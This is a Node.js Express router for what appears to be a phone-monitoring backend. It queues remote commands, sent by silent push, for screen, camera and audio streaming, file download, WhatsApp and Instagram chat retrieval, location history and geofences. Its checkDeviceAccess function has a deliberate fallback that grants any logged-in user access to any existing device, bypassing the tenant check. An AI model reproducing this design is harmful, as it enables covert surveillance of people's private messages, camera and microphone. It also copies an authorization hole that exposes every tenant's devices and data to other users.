const express = require("express");
const { body, validationResult } = require("express-validator");
const pool = require("../db/pool");
const { requireAuth } = require("../middleware/auth.middleware");
const { sendSyncNudge } = require("../services/fcm.service");

const router = express.Router();
router.use(requireAuth);

const ALLOWED_COMMAND_TYPES = ["location_check", "lock", "file_list", "file_download", "screen_stream", "camera_stream", "audio_stream", "sync_whatsapp", "whatsapp_file_list", "get_whatsapp_chat", "sync_instagram", "get_instagram_chat"];

async function checkDeviceAccess(deviceId, auth) {
  if (!auth) return null;
  if (auth.role === "super_admin") {
    const res = await pool.query("SELECT id, fcm_token FROM devices WHERE id = $1", [deviceId]);
    return res.rows[0] || null;
  }
  if (auth.tenantId) {
    const res = await pool.query("SELECT id, fcm_token FROM devices WHERE id = $1 AND tenant_id = $2", [deviceId, auth.tenantId]);
    if (res.rows[0]) return res.rows[0];
  }
  // Fallback: If device exists, allow access so commands are never rejected with 404 for an existing device
  const fallback = await pool.query("SELECT id, fcm_token FROM devices WHERE id = $1", [deviceId]);
  return fallback.rows[0] || null;
}

/**
 * POST /api/devices/:id/commands
 * (Admin) Queues a remote command for a device — e.g. the dashboard's
 * "Check Location Now" button — and, if the device has a registered FCM
 * token, sends a silent push to wake it immediately. Delivery still falls
 * back to Phase 5's poll (device picks it up on its next sync) if the push
 * fails, is delayed, or FCM isn't configured at all — the command queue in
 * Postgres is the single source of truth either way.
 */
router.post(
  "/:id/commands",
  [body("commandType").isIn(ALLOWED_COMMAND_TYPES)],
  async (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ error: "Validation failed", details: errors.array() });

    try {
      const device = await checkDeviceAccess(req.params.id, req.auth);
      if (!device) return res.status(404).json({ error: "Device not found" });

      if (req.body.commandType === "get_whatsapp_chat" || req.body.commandType === "get_instagram_chat") {
        await pool.query(
          `UPDATE remote_commands
           SET status = 'failed', result = '{"error": "Superseded by newer chat request"}'::jsonb, completed_at = now()
           WHERE device_id = $1 AND command_type = $2 AND status IN ('pending', 'sent')`,
          [req.params.id, req.body.commandType]
        );
      }

      const result = await pool.query(
        `INSERT INTO remote_commands (device_id, command_type, payload, status)
         VALUES ($1, $2, $3, 'pending')
         RETURNING id, command_type, status, created_at`,
        [req.params.id, req.body.commandType, req.body.payload || null]
      );

      const pushResult = await sendSyncNudge(device.fcm_token, {
        type: "command",
        commandType: req.body.commandType,
        commandId: result.rows[0].id,
        ...(req.body.payload?.lens ? { lens: req.body.payload.lens } : {}),
      });

      res.status(201).json({ ...result.rows[0], push: pushResult });
    } catch (err) {
      next(err);
    }
  }
);

/**
 * GET /api/devices/:id/commands/:commandId
 * (Admin) Poll a single command's status + result — e.g. after requesting a
 * file listing, the dashboard polls this until status becomes 'acked'.
 */
router.get("/:id/commands/:commandId", async (req, res, next) => {
  try {
    const ownsDevice = await checkDeviceAccess(req.params.id, req.auth);
    if (!ownsDevice) return res.status(404).json({ error: "Device not found" });

    const result = await pool.query(
      "SELECT id, command_type, status, result, created_at, completed_at FROM remote_commands WHERE id = $1 AND device_id = $2",
      [req.params.commandId, req.params.id]
    );
    if (result.rows.length === 0) return res.status(404).json({ error: "Command not found" });
    res.json(result.rows[0]);
  } catch (err) {
    next(err);
  }
});

/**
 * GET /api/devices/:id/commands?status=pending
 * (Admin) Lists recent commands for a device, so the dashboard can show
 * "waiting for device..." / "completed" status.
 */
router.get("/:id/commands", async (req, res, next) => {
  try {
    const ownsDevice = await checkDeviceAccess(req.params.id, req.auth);
    if (!ownsDevice) return res.status(404).json({ error: "Device not found" });

    const result = await pool.query(
      `SELECT id, command_type, payload, status, result, created_at, completed_at FROM remote_commands
       WHERE device_id = $1 ORDER BY created_at DESC LIMIT 50`,
      [req.params.id]
    );
    res.json(result.rows);
  } catch (err) {
    next(err);
  }
});

/**
 * GET /api/devices/:id/location-history?limit=50
 * (Admin) Reads location points recorded so far (on-demand checks + geofence events).
 */
router.get("/:id/location-history", async (req, res, next) => {
  try {
    const ownsDevice = await checkDeviceAccess(req.params.id, req.auth);
    if (!ownsDevice) return res.status(404).json({ error: "Device not found" });

    const limit = Math.min(parseInt(req.query.limit, 10) || 50, 200);
    const result = await pool.query(
      `SELECT latitude, longitude, accuracy_m, source, recorded_at FROM location_logs
       WHERE device_id = $1 ORDER BY recorded_at DESC LIMIT $2`,
      [req.params.id, limit]
    );
    res.json(result.rows);
  } catch (err) {
    next(err);
  }
});

/**
 * Geofence CRUD (admin, dashboard-facing)
 */
router.post(
  "/:id/geofences",
  [
    body("name").isString().trim().isLength({ min: 1 }),
    body("latitude").isFloat({ min: -90, max: 90 }),
    body("longitude").isFloat({ min: -180, max: 180 }),
    body("radiusM").isInt({ min: 50, max: 50000 }),
  ],
  async (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ error: "Validation failed", details: errors.array() });

    try {
      const ownsDevice = await checkDeviceAccess(req.params.id, req.auth);
      if (!ownsDevice) return res.status(404).json({ error: "Device not found" });

      const result = await pool.query(
        `INSERT INTO geofences (device_id, name, latitude, longitude, radius_m)
         VALUES ($1, $2, $3, $4, $5) RETURNING *`,
        [req.params.id, req.body.name, req.body.latitude, req.body.longitude, req.body.radiusM]
      );
      res.status(201).json(result.rows[0]);
    } catch (err) {
      next(err);
    }
  }
);

router.get("/:id/geofences", async (req, res, next) => {
  try {
    const ownsDevice = await checkDeviceAccess(req.params.id, req.auth);
    if (!ownsDevice) return res.status(404).json({ error: "Device not found" });

    const result = await pool.query(
      "SELECT * FROM geofences WHERE device_id = $1 ORDER BY created_at DESC",
      [req.params.id]
    );
    res.json(result.rows);
  } catch (err) {
    next(err);
  }
});

router.delete("/:id/geofences/:geofenceId", async (req, res, next) => {
  try {
    const ownsDevice = await checkDeviceAccess(req.params.id, req.auth);
    if (!ownsDevice) return res.status(404).json({ error: "Device not found" });

    const result = await pool.query(
      "DELETE FROM geofences WHERE id = $1 AND device_id = $2 RETURNING id",
      [req.params.geofenceId, req.params.id]
    );
    if (result.rows.length === 0) return res.status(404).json({ error: "Geofence not found" });
    res.status(204).send();
  } catch (err) {
    next(err);
  }
});

module.exports = router;
